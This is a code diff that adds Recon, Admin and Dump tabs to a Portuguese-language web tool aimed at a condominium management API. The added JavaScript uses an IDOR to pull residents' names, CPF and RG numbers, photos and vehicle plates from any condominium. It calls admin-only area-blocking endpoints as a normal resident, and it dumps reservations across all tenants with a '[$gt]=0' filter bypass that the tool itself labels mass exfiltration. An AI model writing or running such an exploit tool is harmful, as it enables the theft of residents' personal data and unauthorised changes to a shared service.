@@ -65,6 +65,9 @@
     <button class="tab" onclick="showTab(this,'minhas')">📌 Minhas</button>
     <button class="tab" onclick="showTab(this,'espiao')">🕵️ Espião</button>
     <button class="tab" onclick="showTab(this,'troca')">🔄 Troca</button>
+    <button class="tab" onclick="showTab(this,'recon')" style="color:#ef4444">🔍 Recon</button>
+    <button class="tab" onclick="showTab(this,'admin')" style="color:#ef4444">⚡ Admin</button>
+    <button class="tab" onclick="showTab(this,'dump')" style="color:#ef4444">💀 Dump</button>
   </div>
 
   <!-- LOGIN - Suporte a 2 contas -->
@@ -195,6 +198,60 @@
     <p class="help">💡 Cancela com uma conta e reserva com outra em milissegundos. Token renovado antes da troca.</p>
     <div id="troca-log" class="log" style="margin-top:12px"></div>
   </div>
+
+<!-- RECON -->
+<div id="tab-recon" class="panel">
+  <div class="form-row">
+    <div class="form-group"><label>Condomínio</label><input id="r-condo" type="number" value="2078"></div>
+    <div class="form-group">
+      <label>Conta</label>
+      <select id="r-account"><option value="1">Conta 1</option><option value="2">Conta 2</option></select>
+    </div>
+    <div><label>&nbsp;</label><button class="btn" onclick="loadRecon()" style="background:#dc2626">🔍 Recon</button></div>
+  </div>
+  <p class="help">⚠️ IDOR: acessa moradores e veículos de QUALQUER condomínio (cross-tenant).</p>
+  <div id="recon-moradores"></div>
+  <div id="recon-veiculos" style="margin-top:20px"></div>
+</div>
+
+<!-- ADMIN -->
+<div id="tab-admin" class="panel">
+  <h3 style="color:#ef4444;margin-bottom:16px">⚡ Admin Mode — Privilege Escalation</h3>
+  <p class="help" style="margin-bottom:16px">Funções de síndico/admin acessíveis por morador normal.</p>
+
+  <div style="display:flex;gap:8px;margin-bottom:16px">
+    <button class="btn" onclick="loadBloqueios()" style="background:#dc2626">🔒 Listar Bloqueios</button>
+    <button class="btn" onclick="showCriarBloqueio()" style="background:#7c2d12">➕ Criar Bloqueio</button>
+  </div>
+
+  <div id="criar-bloqueio" style="display:none;margin-bottom:16px;padding:14px;background:#0f172a;border-radius:8px">
+    <div class="form-row">
+      <div class="form-group"><label>Área</label><input id="ab-area" type="number" placeholder="17"></div>
+      <div class="form-group"><label>Descrição</label><input id="ab-desc" placeholder="Manutenção"></div>
+      <div class="form-group"><label>Data Início</label><input id="ab-ini" type="date"></div>
+      <div class="form-group"><label>Data Fim</label><input id="ab-fim" type="date"></div>
+      <div><label>&nbsp;</label><button class="btn btn-danger" onclick="criarBloqueio()">Bloquear</button></div>
+    </div>
+  </div>
+
+  <div id="admin-bloqueios"></div>
+</div>
+
+<!-- DUMP -->
+<div id="tab-dump" class="panel">
+  <h3 style="color:#ef4444;margin-bottom:16px">💀 Dump Mode — Exfiltração Massiva</h3>
+  <p class="help" style="margin-bottom:16px">Bypass [$gt]=0 para ignorar filtro de condomínio. Retorna dados de TODOS os condos.</p>
+  <div class="form-row">
+    <div class="form-group">
+      <label>Conta</label>
+      <select id="d-account"><option value="1">Conta 1</option><option value="2">Conta 2</option></select>
+    </div>
+    <div><label>&nbsp;</label><button class="btn" onclick="doDump()" style="background:#dc2626">💀 Dump Tudo</button></div>
+  </div>
+  <div id="dump-status"></div>
+  <div id="dump-stats" style="margin-top:16px"></div>
+</div>
+
 </div>
 
 <script>
@@ -691,6 +748,186 @@ async function executeTroca() {
     if (i >= 3) await new Promise(r => setTimeout(r, 50));
   }
   tLog('💀 Falhou. Reserva #' + cod + ' foi cancelada mas nova não criou!', 'err');
+}
+
+// ===== RECON =====
+async function loadRecon() {
+  const condo = parseInt(document.getElementById('r-condo').value);
+  const acct = parseInt(document.getElementById('r-account').value);
+  if (!accounts[acct]?.token) { alert('Login primeiro'); return; }
+
+  // Moradores
+  document.getElementById('recon-moradores').innerHTML = '<p>⏳ Carregando moradores...</p>';
+  const rm = await apiFetch('GET', API_MORADOR + '/api/v1/liberacaoAcesso/' + condo + '/ativas', null, acct);
+
+  if (rm.status === 200 && Array.isArray(rm.data) && rm.data.length) {
+    let html = '<h3 style="color:#38bdf8;margin-bottom:8px">👥 Moradores — ' + rm.data.length + ' registros</h3>';
+    html += '<table><tr><th>#</th><th>Nome</th><th>CPF</th><th>RG</th><th>Unidade</th><th>Tipo</th><th>Foto</th></tr>';
+    rm.data.forEach((m, i) => {
+      const tipo = typeof m.tipoAcesso === 'object' ? (m.tipoAcesso?.descricao || '?') : m.tipoAcesso;
+      const foto = m.foto ? '📷' : '';
+      html += '<tr><td>' + (i+1) + '</td><td>' + (m.nome||'?') + '</td><td style="font-family:monospace">' + (m.cpf||'') + '</td>';
+      html += '<td>' + (m.rg||'') + '</td><td>' + (m.unidade||'') + '</td><td>' + tipo + '</td><td>' + foto + '</td></tr>';
+    });
+    html += '</table>';
+    document.getElementById('recon-moradores').innerHTML = html;
+  } else if (rm.status === 204) {
+    document.getElementById('recon-moradores').innerHTML = '<p>Sem dados de moradores para este condomínio.</p>';
+  } else {
+    document.getElementById('recon-moradores').innerHTML = '<p style="color:#ef4444">Erro: ' + JSON.stringify(rm.data) + '</p>';
+  }
+
+  // Veiculos
+  document.getElementById('recon-veiculos').innerHTML = '<p>⏳ Carregando veículos...</p>';
+  const rv = await apiFetch('GET', API_MORADOR + '/api/v1/portaria/' + condo + '/veiculo', null, acct);
+
+  if (rv.status === 200 && Array.isArray(rv.data) && rv.data.length) {
+    let html = '<h3 style="color:#38bdf8;margin-bottom:8px">🚗 Veículos — ' + rv.data.length + ' registros</h3>';
+    html += '<table><tr><th>#</th><th>Placa</th><th>Dono</th><th>Unidade</th><th>Tipo</th><th>Marca/Modelo</th><th>Cor</th></tr>';
+    rv.data.forEach((v, i) => {
+      html += '<tr><td>' + (i+1) + '</td><td style="font-weight:600">' + (v.placa||'') + '</td><td>' + (v.nome||'') + '</td>';
+      html += '<td>' + (v.unidade||'') + '</td><td>' + (v.tipoVeiculoDescricao||'') + '</td>';
+      html += '<td>' + ((v.marca||'') + ' ' + (v.modelo||'')).trim() + '</td><td>' + (v.cor||'') + '</td></tr>';
+    });
+    html += '</table>';
+    document.getElementById('recon-veiculos').innerHTML = html;
+  } else if (rv.status === 204) {
+    document.getElementById('recon-veiculos').innerHTML = '<p>Sem dados de veículos.</p>';
+  } else {
+    document.getElementById('recon-veiculos').innerHTML = '<p style="color:#ef4444">Erro: ' + JSON.stringify(rv.data) + '</p>';
+  }
+}
+
+// ===== ADMIN =====
+function showCriarBloqueio() {
+  const el = document.getElementById('criar-bloqueio');
+  el.style.display = el.style.display === 'none' ? 'block' : 'none';
+}
+
+async function loadBloqueios() {
+  const acct = 1;
+  if (!accounts[acct]?.token) { alert('Login primeiro'); return; }
+  const a = accounts[acct];
+
+  document.getElementById('admin-bloqueios').innerHTML = '<p>⏳ Carregando...</p>';
+  const r = await apiFetch('GET', API_MORADOR + '/api/v1/areaConfiguracao/' + a.condo + '/bloqueio', null, acct);
+
+  if (r.status !== 200 || !Array.isArray(r.data)) {
+    document.getElementById('admin-bloqueios').innerHTML = '<p>Nenhum bloqueio encontrado.</p>';
+    return;
+  }
+
+  let html = '<table><tr><th>ID</th><th>Área</th><th>Descrição</th><th>Início</th><th>Fim</th><th>Ativo</th><th></th></tr>';
+  r.data.forEach(b => {
+    const ativo = b.ativo ? '<span class="badge badge-ok">Sim</span>' : '<span class="badge badge-no">Não</span>';
+    html += '<tr><td>' + b.codigoBloqueio + '</td><td>' + b.codigoArea + ' ' + (b.nomeArea||'').substring(0,20) + '</td>';
+    html += '<td>' + (b.descricao||'') + '</td><td>' + (b.dataInicio||'').substring(0,10) + '</td>';
+    html += '<td>' + (b.dataFim||'').substring(0,10) + '</td><td>' + ativo + '</td>';
+    if (b.ativo) {
+      html += '<td><button class="btn btn-sm btn-danger" onclick="removerBloqueio(' + b.codigoArea + ',' + b.codigoBloqueio + ',\'' + (b.descricao||'').replace(/'/g,'') + '\',\'' + b.dataInicio + '\',\'' + b.dataFim + '\')">Desativar</button></td>';
+    } else {
+      html += '<td></td>';
+    }
+    html += '</tr>';
+  });
+  html += '</table>';
+  document.getElementById('admin-bloqueios').innerHTML = html;
+}
+
+async function criarBloqueio() {
+  const acct = 1;
+  if (!accounts[acct]?.token) { alert('Login primeiro'); return; }
+
+  const area = parseInt(document.getElementById('ab-area').value);
+  const desc = document.getElementById('ab-desc').value || 'Bloqueio';
+  const ini = document.getElementById('ab-ini').value;
+  const fim = document.getElementById('ab-fim').value || ini;
+  if (!area || !ini) { alert('Preencha área e data'); return; }
+  if (!confirm('Criar bloqueio na área ' + area + ' de ' + ini + ' a ' + fim + '?')) return;
+
+  const r = await apiFetch('POST', API_MORADOR + '/api/v1/areaConfiguracao/' + area + '/bloqueio', {
+    CodigoArea: area, Descricao: desc,
+    DataInicio: ini + 'T00:00:00', DataFim: fim + 'T23:59:59',
+    CodigoCondominio: accounts[acct].condo
+  }, acct);
+
+  if (r.status === 200) {
+    alert('✅ Bloqueio criado! ID: ' + r.data);
+    loadBloqueios();
+    document.getElementById('criar-bloqueio').style.display = 'none';
+  } else {
+    alert('❌ Erro: ' + JSON.stringify(r.data));
+  }
+}
+
+async function removerBloqueio(area, bid, desc, ini, fim) {
+  if (!confirm('Desativar bloqueio ' + bid + '?')) return;
+  const acct = 1;
+  const r = await apiFetch('PUT', API_MORADOR + '/api/v1/areaConfiguracao/' + area + '/bloqueio/' + bid, {
+    CodigoArea: area, CodigoBloqueio: bid, Ativo: false,
+    Descricao: desc, DataInicio: ini, DataFim: fim
+  }, acct);
+  if (r.status === 200) { alert('✅ Desativado!'); loadBloqueios(); }
+  else alert('❌ ' + JSON.stringify(r.data));
+}
+
+// ===== DUMP =====
+async function doDump() {
+  const acct = parseInt(document.getElementById('d-account').value);
+  if (!accounts[acct]?.token) { alert('Login primeiro'); return; }
+
+  const statusEl = document.getElementById('dump-status');
+  const statsEl = document.getElementById('dump-stats');
+
+  statusEl.innerHTML = '<p>⏳ Baixando todas as reservas (cross-condomínio)...</p>';
+  statsEl.innerHTML = '';
+
+  const rr = await apiFetch('GET', API_MORADOR + '/api/v1/reservas?codigoCondominio[$gt]=0', null, acct);
+
+  let reservas = [];
+  if (rr.status === 200 && Array.isArray(rr.data)) {
+    reservas = rr.data;
+    const condos = new Set();
+    const nomes = new Set();
+    rr.data.forEach(r => {
+      if (r.condominio?.codigo) condos.add(r.condominio.codigo);
+      if (r.nome) nomes.add(r.nome);
+    });
+    statusEl.innerHTML = '<p style="color:#22c55e">✅ <b>' + rr.data.length + ' reservas</b> | <b>' + condos.size + ' condominios</b> | <b>' + nomes.size + ' moradores</b></p>';
+  } else {
+    statusEl.innerHTML += '<p style="color:#ef4444">Erro reservas: ' + JSON.stringify(rr.data) + '</p>';
+  }
+
+  statusEl.innerHTML += '<p>⏳ Baixando todas as áreas...</p>';
+  const ra = await apiFetch('GET', API_MORADOR + '/api/v1/areas?codigoCondominio[$gt]=0', null, acct);
+
+  if (ra.status === 200 && Array.isArray(ra.data)) {
+    statusEl.innerHTML += '<p style="color:#22c55e">✅ <b>' + ra.data.length + ' áreas</b></p>';
+  }
+
+  // Top condominios
+  if (reservas.length) {
+    const condoCount = {};
+    reservas.forEach(r => {
+      const c = r.condominio;
+      if (c?.codigo) {
+        const key = c.codigo + ' - ' + (c.descricao || '?');
+        condoCount[key] = (condoCount[key] || 0) + 1;
+      }
+    });
+    const sorted = Object.entries(condoCount).sort((a,b) => b[1] - a[1]).slice(0, 15);
+    const max = sorted[0]?.[1] || 1;
+
+    let html = '<h3 style="color:#38bdf8;margin-bottom:8px">🏢 Top condominios por reservas</h3><table><tr><th>Qtd</th><th>Bar</th><th>Condomínio</th></tr>';
+    sorted.forEach(([key, cnt]) => {
+      const pct = Math.round(cnt / max * 100);
+      html += '<tr><td style="font-weight:600">' + cnt + '</td>';
+      html += '<td><div style="background:#2563eb;height:12px;width:' + pct + '%;border-radius:3px;min-width:4px"></div></td>';
+      html += '<td style="font-size:0.8em">' + key + '</td></tr>';
+    });
+    html += '</table>';
+    statsEl.innerHTML = html;
+  }
 }
 
 // Defaults
